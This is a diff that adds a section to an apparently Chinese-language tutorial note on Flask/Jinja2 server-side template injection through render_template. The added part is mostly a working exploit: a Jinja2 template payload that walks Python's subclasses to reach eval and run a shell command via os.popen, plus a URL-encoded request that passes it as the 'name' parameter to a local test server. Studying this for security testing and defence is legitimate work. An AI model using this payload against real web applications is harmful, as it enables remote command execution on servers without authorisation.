@@ -24,3 +24,25 @@ render_template渲染函数的问题
 
 ## 3、判断类型
 ![image](https://user-images.githubusercontent.com/24989246/173509402-624cc9f7-36f5-4e23-9e54-d6e8e5358196.png)
+
+# 常见的模板注入利用方式
+## 1、官方的漏洞利用方法：
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
+ 把上面这一串当做name参数传递即可实现命令执行：
+```shell
+ http://192.168.1.10:8000/?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20}}%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
+```
+
+
